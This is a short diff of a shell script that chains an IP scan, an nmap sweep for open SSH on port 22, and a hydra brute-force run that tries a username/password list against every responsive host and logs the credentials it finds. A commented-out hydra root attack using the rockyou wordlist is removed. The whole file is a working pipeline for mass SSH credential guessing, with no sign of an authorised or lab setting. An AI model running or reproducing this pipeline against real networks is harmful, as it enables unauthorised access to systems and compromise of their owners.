@@ -1,5 +1,6 @@
-bash ipScan.sh
-python portCleanup.py > ipOpen
+bash ipScan.sh #output to lib/liveIps
+python ipCleanup.py #output to lib/ips
+nmap -iL lib/ips -p22 -oN lib/sshOpen -Pn
+python portCleanup.py > lib/ipOpen
 
-cat ipOpen
-#hydra -l root -P /usr/share/wordlist/rockyou.txt [ip] ssh -t 4
+hydra -C usr/userpass.lst -M lib/ipOpen -o log/found -t 1 ssh
